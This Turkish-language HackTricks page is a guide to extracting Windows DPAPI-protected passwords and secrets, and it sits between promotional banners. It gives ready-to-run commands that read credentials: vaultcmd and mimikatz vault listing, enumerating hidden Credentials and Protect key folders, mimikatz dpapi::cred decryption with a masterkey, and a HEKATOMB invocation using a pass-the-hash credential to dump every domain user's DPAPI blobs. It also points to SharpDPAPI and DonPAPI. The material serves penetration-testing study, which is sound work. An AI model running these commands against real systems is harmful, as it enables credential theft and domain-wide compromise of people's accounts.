# DPAPI - Parolaları Çıkarma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? veya PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) görün
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**💬**](https://emojipedia.org/speech-balloon/) **Discord grubuna** katılın veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile katkıda bulunun.**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/), **İspanya**'daki en ilgili siber güvenlik etkinliği ve **Avrupa**'nın en önemlilerinden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## DPAPI Nedir

Veri Koruma API'si (DPAPI), Windows işletim sistemi içinde **asimetrik özel anahtarların simetrik şifrelemesi** için öncelikle kullanılır ve kullanıcı veya sistem sırlarını önemli bir entropi kaynağı olarak kullanır. Bu yaklaşım, geliştiricilerin, verileri kullanıcının oturum açma sırlarından türetilen bir anahtar kullanarak veya sistem şifrelemesi için sistem alan kimlik doğrulama sırlarını kullanarak verileri şifrelemesine olanak tanıyarak geliştiricilerin şifreleme anahtarını kendilerinin koruması gereksinimini ortadan kaldırır.

### DPAPI Tarafından Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

* Internet Explorer ve Google Chrome'un parolaları ve otomatik tamamlama verileri
* Outlook ve Windows Mail gibi uygulamalar için e-posta ve iç FTP hesap parolaları
* Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar, şifreleme anahtarları dahil
* Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için özel anahtarlar için parolalar
* Kimlik Yöneticisi tarafından yönetilen ağ parolaları ve Skype, MSN messenger ve daha fazlasını içeren CryptProtectData kullanan uygulamalardaki kişisel veriler

## Vault Listesi
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kimlik Dosyaları

**Korunan kimlik dosyaları** şurada bulunabilir:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Mimikatz `dpapi::cred` kullanarak kimlik bilgileri bilgisini alın, yanıtta şifrelenmiş veri ve guidMasterKey gibi ilginç bilgiler bulabilirsiniz.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
**mimikatz modülü** `dpapi::cred`'i uygun `/masterkey` ile kullanarak şifreleri çözebilirsiniz:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Anahtarlar

Kullanıcının RSA anahtarlarını şifrelemek için kullanılan DPAPI anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizini altında saklanır, burada {SID} kullanıcının [**Güvenlik Tanımlayıcısı**](https://en.wikipedia.org/wiki/Security_Identifier)'dır. **DPAPI anahtarı, genellikle kullanıcıların özel anahtarlarını koruyan anahtarla aynı dosyada saklanır**. Genellikle rastgele verilerden oluşan 64 bayttır. (Bu dizin korunduğundan dolayı `dir` komutunu kullanarak listelenemez, ancak PS üzerinden listelenebilir).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bu, bir kullanıcının bir dizi Anahtarın nasıl görüneceğini gösterir:

![](<../../.gitbook/assets/image (1118).png>)

Genellikle **her anahtar, diğer içeriği şifreleyebilen şifreli bir simetrik anahtardır**. Bu nedenle, daha sonra **bu anahtarla şifrelenmiş diğer içeriği çözmek** için **şifreli Anahtar'ın çıkarılması** ilginçtir.

### Anahtarın çıkarılması ve şifrelenmesi

Anahtarın nasıl çıkarılacağı ve şifreleneceği konusunda bir örnek için [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) gönderisine bakın.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1), [@gentilkiwi](https://twitter.com/gentilkiwi)'nin [Mimikatz](https://github.com/gentilkiwi/mimikatz/) projesinden bazı DPAPI işlevselliğinin bir C# portudur.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP dizininden tüm kullanıcıları ve bilgisayarları çıkarmayı ve RPC aracılığıyla etki alanı denetleyici yedek anahtarını çıkarmayı otomatikleştiren bir araçtır. Daha sonra betik, tüm bilgisayarların IP adreslerini çözecek ve tüm kullanıcıların DPAPI bloklarını almak ve etki alanı yedek anahtarı ile her şeyi şifrelemek için tüm bilgisayarlarda smbclient çalıştıracaktır.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP bilgisayar listesinden çıkarıldığında, onları bilmiyor olsanız bile her alt ağı bulabilirsiniz!

"Çünkü Etki Alanı Yönetici hakları yeterli değil. Hepsini hackleyin."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan sırları otomatik olarak dökebilir.

## Referanslar

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/), **İspanya**'daki en ilgili siber güvenlik etkinliği ve **Avrupa**'nın en önemlilerinden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Bir **siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizi HackTricks'te görmek ister misiniz? veya PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerine**](https://peass.creator-spring.com) sahip olun
* **💬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **üzerinden PR gönderin.**

</details>
